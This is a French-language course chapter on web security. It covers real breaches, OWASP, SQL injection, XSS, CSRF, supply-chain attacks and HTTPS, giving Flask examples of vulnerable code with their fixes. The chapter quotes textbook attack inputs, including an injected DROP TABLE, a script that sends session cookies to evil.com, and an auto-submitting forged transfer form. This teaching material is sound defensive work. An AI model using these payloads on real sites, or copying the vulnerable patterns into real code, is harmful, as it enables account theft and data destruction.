---
title: "Est-ce que c'est sécuritaire ?"
weight: 50
slug: "securite"
---

# Est-ce que c'est sécuritaire ?

La sécurité informatique est souvent traitée comme une préoccupation secondaire
dans le développement logiciel. On construit d'abord les fonctionnalités, on
déploie, et on se dit qu'on "ajoutera la sécurité plus tard". Cette approche a
un nom : le modèle du "château fort", où la sécurité est une muraille qu'on
érige autour d'un système déjà construit. Le problème, c'est que les attaquants
ne se présentent pas toujours à la porte d'entrée : ils exploitent les failles
dans les fondations, ou ils sont déjà à l'intérieur. En septembre 2017, Equifax,
l'une des trois grandes agences d'évaluation du crédit aux États-Unis, a révélé
que les données personnelles de 147 millions de personnes avaient été volées :
noms, numéros de sécurité sociale, dates de naissance, adresses. La cause ? Une
vulnérabilité connue dans Apache Struts, un framework web Java, pour laquelle un
correctif existait depuis mars 2017. Equifax ne l'avait tout simplement pas
appliqué. La vulnérabilité en question permettait l'exécution de code arbitraire
à distance, et elle figurait dans le OWASP Top 10, le classement de référence
des vulnérabilités web les plus courantes. En juin 2019, c'est au Québec que
l'une des plus grandes fuites de données au Canada a été révélée : un employé du
Mouvement Desjardins avait exfiltré les données personnelles de 9,7 millions de
membres, soit la quasi-totalité de la clientèle. Noms, adresses, dates de
naissance, numéros d'assurance sociale, habitudes transactionnelles.
Contrairement à Equifax, il ne s'agissait pas d'une faille technique exploitée
de l'extérieur, mais d'une menace interne : un utilisateur légitime qui avait
accès à des données qu'il n'aurait probablement pas dû pouvoir extraire en
masse. L'incident a mis en lumière l'importance du principe du moindre privilège
et de la surveillance des accès internes, des aspects de la sécurité qui ne se
règlent pas avec un pare-feu.

Ces deux incidents illustrent une leçon que l'industrie a mis du temps à
intégrer : la sécurité ne peut pas être une couche ajoutée après coup. C'est
l'idée du *shift left* en sécurité, une expression empruntée au mouvement
DevOps : au lieu de vérifier la sécurité à la fin du cycle de développement (à
droite sur la ligne du temps), on la déplace vers le début (à gauche), en
l'intégrant dès la conception et le codage. Cette philosophie a donné naissance
au terme **DevSecOps**, qui insère la sécurité au coeur du pipeline de livraison
continue. Concrètement, cela signifie que les vulnérabilités doivent être
détectées et corrigées aussi tôt que possible : dans l'éditeur du développeur,
dans les tests, dans le pipeline CI, plutôt qu'en production quand il est déjà
trop tard. Pour structurer cette vigilance, l'industrie s'appuie sur un cadre de
référence maintenu par l'OWASP (*Open Web Application Security Project*), une
fondation à but non lucratif créée en 2001. Son produit le plus connu est le
**OWASP Top 10**, un classement régulièrement mis à jour des dix catégories de
vulnérabilités web les plus critiques. L'édition 2021 (la plus récente au moment
d'écrire ces lignes) inclut notamment les injections (SQL, commandes), le
cross-site scripting (XSS), les problèmes d'authentification, les mauvaises
configurations de sécurité, et les composants avec des vulnérabilités connues
(exactement le problème d'Equifax). Plutôt que de tenter un survol exhaustif de
ces dix catégories, nous allons examiner en profondeur quelques-unes des
vulnérabilités les plus courantes et les plus instructives.

## Injection SQL

L'injection SQL est probablement la vulnérabilité la plus connue et la plus
enseignée en sécurité informatique. Elle consiste à insérer du code SQL
malicieux dans un champ de saisie utilisateur, de manière à manipuler la requête
que l'application envoie à sa base de données. Le principe est d'une simplicité
déconcertante. Imaginons une application Flask qui permet de chercher un
utilisateur par nom :

```python
@app.route("/user")
def get_user():
    name = request.args.get("name")
    query = f"SELECT * FROM users WHERE name = '{name}'"
    result = db.execute(query)
    return jsonify(result.fetchall())
```

Si un utilisateur normal envoie `?name=Alice`, la requête devient
`SELECT * FROM users WHERE name = 'Alice'`, ce qui fonctionne comme prévu. Mais
si un attaquant envoie `?name=' OR '1'='1`, la requête devient
`SELECT * FROM users WHERE name = '' OR '1'='1'`, ce qui retourne **tous** les
utilisateurs de la table, puisque la condition `'1'='1'` est toujours vraie.
Pire encore, un attaquant pourrait envoyer `?name='; DROP TABLE users; --` pour
tenter de supprimer la table entière. Le commentaire SQL `--` à la fin
neutralise le reste de la requête originale.

La correction est simple et connue depuis des décennies : les **requêtes
paramétrées** (aussi appelées *prepared statements*). Au lieu de construire la
requête par concaténation de chaînes, on utilise des paramètres que le moteur
SQL traite comme des données, jamais comme du code :

```python
@app.route("/user")
def get_user():
    name = request.args.get("name")
    query = "SELECT * FROM users WHERE name = :name"
    result = db.execute(query, {"name": name})
    return jsonify(result.fetchall())
```

Avec cette approche, même si l'attaquant envoie `' OR '1'='1`, le moteur SQL
cherchera littéralement un utilisateur dont le nom est la chaîne
`' OR '1'='1'`, et ne trouvera rien. La requête paramétrée garantit que l'entrée
utilisateur ne peut jamais être interprétée comme du code SQL. Les ORMs comme
SQLAlchemy (que nous avons rencontré dans le module 3) utilisent des requêtes
paramétrées par défaut, ce qui rend l'injection SQL beaucoup plus difficile à
introduire accidentellement. C'est un excellent exemple d'un principe récurrent
en sécurité : les bons outils et les bonnes abstractions protègent le
développeur de lui-même.

## Cross-Site Scripting (XSS)

Le cross-site scripting, ou XSS, est une vulnérabilité qui exploite la confiance
qu'un navigateur accorde au contenu d'un site web. Le principe : un attaquant
parvient à injecter du code JavaScript dans une page qui sera affichée à
d'autres utilisateurs. Le navigateur de la victime exécute ce code comme s'il
provenait du site légitime, ce qui donne à l'attaquant accès aux cookies de
session, aux données affichées, et potentiellement au compte de l'utilisateur.
Comme l'injection SQL, le XSS repose sur une confusion entre données et code,
mais cette fois-ci côté client plutôt que côté serveur. Imaginons une
application Flask qui affiche un message de bienvenue personnalisé :

```python
@app.route("/hello")
def hello():
    name = request.args.get("name", "")
    return f"<h1>Bonjour {name} !</h1>"
```

Si un utilisateur visite `/hello?name=Alice`, la page affiche « Bonjour
Alice ! ». Mais si un attaquant envoie
`/hello?name=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`,
le navigateur exécute le JavaScript injecté et envoie les cookies de la victime
au serveur de l'attaquant. Ce type de XSS est dit « réfléchi » (*reflected*) :
le code malicieux fait un aller-retour via le serveur dans la réponse HTTP. Il
existe aussi le XSS « stocké » (*stored*), plus dangereux, où le code malicieux
est sauvegardé dans la base de données (par exemple dans un commentaire de
forum) et exécuté à chaque fois qu'un utilisateur consulte la page.

La défense contre le XSS repose sur un principe fondamental :
l'**échappement** (*escaping*) des données utilisateur avant de les insérer
dans le HTML. L'idée est de transformer les caractères spéciaux HTML (`<`, `>`,
`&`, `"`, `'`) en leurs entités correspondantes (`&lt;`, `&gt;`, etc.), de
sorte que le navigateur les affiche comme du texte plutôt que de les interpréter
comme du code. En Flask, la solution est d'utiliser le moteur de templates
Jinja2, qui échappe automatiquement toutes les variables :

```python
# templates/hello.html
# <h1>Bonjour {{ name }} !</h1>

@app.route("/hello")
def hello():
    name = request.args.get("name", "")
    return render_template("hello.html", name=name)
```

Avec cette approche, si l'attaquant injecte une balise `<script>`, elle sera
affichée littéralement comme du texte (`&lt;script&gt;`) au lieu d'être
exécutée. Comme pour l'injection SQL et les requêtes paramétrées, la meilleure
défense n'est pas la vigilance individuelle du développeur, mais un outil qui
applique la protection par défaut. C'est pourquoi les frameworks web modernes
(Flask/Jinja2, Django, React, Vue) échappent tous le HTML automatiquement. Les
vulnérabilités XSS apparaissent quand un développeur contourne délibérément cet
échappement, par exemple en utilisant `| safe` dans Jinja2 ou
`dangerouslySetInnerHTML` en React, des noms choisis pour que le danger soit
explicite.

## Cross-Site Request Forgery (CSRF)

Le CSRF (parfois prononcé « sea-surf ») exploite un mécanisme différent : la
confiance qu'un serveur accorde au navigateur de l'utilisateur. Quand un
utilisateur est connecté à un site (par exemple sa banque), son navigateur
envoie automatiquement les cookies de session avec chaque requête vers ce site.
Un attaquant peut exploiter ce comportement en piégeant l'utilisateur pour
qu'il envoie, à son insu, une requête vers le site cible. Imaginons une
application bancaire simplifiée :

```python
@app.route("/transfer", methods=["POST"])
def transfer():
    to = request.form["to"]
    amount = request.form["amount"]
    # Le cookie de session authentifie automatiquement l'utilisateur
    execute_transfer(current_user, to, amount)
    return "Transfert effectué"
```

Un attaquant peut créer une page malicieuse contenant un formulaire invisible
qui se soumet automatiquement :

```html
<!-- Sur evil.com -->
<form action="https://banque.com/transfer" method="POST">
  <input type="hidden" name="to" value="attaquant" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

Si la victime visite cette page pendant qu'elle est connectée à sa banque, le
navigateur envoie la requête de transfert avec ses cookies de session valides.
Du point de vue du serveur, la requête est parfaitement légitime. La défense
standard est le **jeton CSRF** (*CSRF token*). Le principe : le serveur génère
un jeton aléatoire unique pour chaque session et l'inclut comme champ caché
dans le HTML du formulaire. À la soumission, le serveur vérifie que le jeton
reçu correspond à celui qu'il a émis. Puisque l'attaquant ne peut pas lire les
pages du site cible (la *same-origin policy* du navigateur l'en empêche), il ne
peut pas deviner le jeton. En Flask, l'extension Flask-WTF intègre cette
protection. Côté serveur, on définit le formulaire et sa validation :

```python
from flask_wtf import FlaskForm
from wtforms import StringField, DecimalField

class TransferForm(FlaskForm):
    to = StringField("Destinataire")
    amount = DecimalField("Montant")

@app.route("/transfer", methods=["GET", "POST"])
def transfer():
    form = TransferForm()
    if form.validate_on_submit():  # Vérifie le jeton CSRF automatiquement
        execute_transfer(current_user, form.to.data, form.amount.data)
        return "Transfert effectué"
    return render_template("transfer.html", form=form)
```

Côté template, le jeton est inséré automatiquement comme champ caché :

```html
<!-- templates/transfer.html -->
<form method="POST" action="/transfer">
  {{ form.hidden_tag() }}  <!-- Génère : <input type="hidden" name="csrf_token" value="a3f8b2c1..." /> -->
  {{ form.to.label }} {{ form.to() }}
  {{ form.amount.label }} {{ form.amount() }}
  <button type="submit">Transférer</button>
</form>
```

L'appel `form.validate_on_submit()` vérifie non seulement les données du
formulaire, mais aussi que le jeton CSRF est présent et valide. Si la requête
provient du formulaire invisible sur `evil.com`, elle n'inclura pas ce jeton, et
le serveur la rejettera avec une erreur 400. Encore une fois, le même schéma se
répète : la protection est intégrée dans le framework, et le développeur en
bénéficie sans effort supplémentaire à condition d'utiliser les bons outils.

## Au-delà du code applicatif

Les trois vulnérabilités que nous venons d'examiner partagent un point commun :
elles sont introduites par le développeur dans son propre code, et elles se
corrigent par de meilleures pratiques de programmation. Mais un logiciel moderne
n'est pas fait que de code écrit en interne. Comme nous l'avons vu dans le
module 2 avec la gestion des dépendances, une application typique importe des
dizaines, voire des centaines de bibliothèques tierces. Chacune de ces
dépendances est un vecteur d'attaque potentiel. Et au-delà du code lui-même,
il y a l'infrastructure : comment les données circulent sur le réseau, comment
les secrets (mots de passe, clés API) sont stockés, comment les utilisateurs
s'authentifient. Les sections qui suivent abordent ces dimensions de la sécurité
qui dépassent le code applicatif.

## La chaîne d'approvisionnement logicielle

En décembre 2020, la firme de cybersécurité FireEye a découvert que SolarWinds,
un éditeur de logiciels de gestion d'infrastructure utilisé par des milliers
d'organisations dont le gouvernement américain, avait été compromis. Des
attaquants (attribués au renseignement russe) avaient réussi à insérer du code
malicieux directement dans le processus de build de SolarWinds, de sorte que
les mises à jour légitimes du produit Orion contenaient une backdoor. Environ
18 000 organisations ont installé cette mise à jour piégée. L'attaque était
remarquable non pas par sa complexité technique, mais par son vecteur : les
victimes n'avaient commis aucune erreur. Elles avaient simplement fait
confiance à leur fournisseur de logiciel et appliqué une mise à jour, exactement
comme les bonnes pratiques le recommandent. C'est le paradoxe de la sécurité de
la chaîne d'approvisionnement (*supply chain security*) : les mêmes mécanismes
de confiance qui permettent à l'écosystème logiciel de fonctionner sont aussi
ses points de vulnérabilité.

Un cas encore plus troublant a émergé en mars 2024 avec la découverte d'une
backdoor dans xz Utils, un utilitaire de compression présent sur pratiquement
toutes les distributions Linux. Un développeur utilisant le pseudonyme « Jia
Tan » avait contribué au projet pendant deux ans, gagnant progressivement la
confiance du mainteneur principal (qui était seul et épuisé), jusqu'à obtenir
les droits de commit. Il avait ensuite inséré, par étapes, un code malicieux
sophistiqué dans le processus de build, conçu pour compromettre les connexions
SSH sur les systèmes affectés. La backdoor a été découverte par hasard par un
ingénieur de Microsoft, Andres Freund, qui avait remarqué que ses connexions
SSH étaient anormalement lentes. Si elle n'avait pas été détectée, elle aurait
potentiellement donné un accès à distance à des millions de serveurs dans le
monde. L'incident illustre un problème structurel de l'écosystème open source,
que nous aborderons plus en détail dans le module 6 : des composants critiques
de l'infrastructure mondiale sont maintenus par des bénévoles isolés, souvent
sans ressources ni relève. L'attaquant n'a pas exploité une faille technique :
il a exploité l'épuisement d'un mainteneur solitaire.

Face à ces menaces, la première ligne de défense est la vigilance sur les
dépendances, un sujet que nous avons abordé dans le module 2. Des outils comme
`pip audit` (pour Python), `npm audit` (pour JavaScript) ou Dependabot (intégré
à GitHub) analysent automatiquement les dépendances d'un projet et signalent
celles qui contiennent des vulnérabilités connues, référencées dans des bases
de données publiques comme le CVE (*Common Vulnerabilities and Exposures*).
L'incident d'Equifax, rappelons-le, aurait été évité par un simple scan de
dépendances. Dans un pipeline CI/CD, ces vérifications peuvent être
automatisées : un build qui échoue parce qu'une dépendance a une vulnérabilité
critique connue est un mécanisme de protection directement en phase avec la
philosophie du shift left. Mais les outils de scanning ne protègent que contre
les vulnérabilités *connues*. L'attaque xz a montré que la menace peut venir de
l'intérieur même du processus de développement, ce qui rend d'autant plus
important le principe de la revue de code, les signatures cryptographiques des
releases, et la diversification des mainteneurs sur les projets critiques.

## HTTPS et le chiffrement en transit

Quand un navigateur communique avec un serveur web via HTTP, les données
circulent en clair sur le réseau. Tout intermédiaire (un routeur Wi-Fi
compromis, un fournisseur d'accès internet, un attaquant sur le même réseau)
peut lire le contenu des requêtes et des réponses : identifiants de connexion,
numéros de carte de crédit, messages personnels. HTTPS résout ce problème en
enveloppant HTTP dans une couche de chiffrement appelée TLS (*Transport Layer
Security*). Le principe est le suivant : avant d'échanger des données, le
navigateur et le serveur effectuent un « handshake » durant lequel le serveur
présente un certificat numérique qui prouve son identité, et les deux parties
négocient une clé de chiffrement partagée. Toutes les données échangées ensuite
sont chiffrées, rendant leur interception inutile pour un attaquant. Le
certificat est émis par une autorité de certification (*Certificate Authority*,
CA) qui vérifie que le demandeur contrôle bien le domaine en question.
Historiquement, obtenir un certificat TLS coûtait cher et nécessitait des
démarches administratives, ce qui freinait l'adoption de HTTPS. En 2015, le
projet Let's Encrypt, fondé par l'Internet Security Research Group (ISRG), a
changé la donne en offrant des certificats gratuits et automatisables.
Aujourd'hui, plus de 80 % du trafic web mondial utilise HTTPS, et les
navigateurs modernes affichent un avertissement explicite pour les sites qui ne
l'utilisent pas.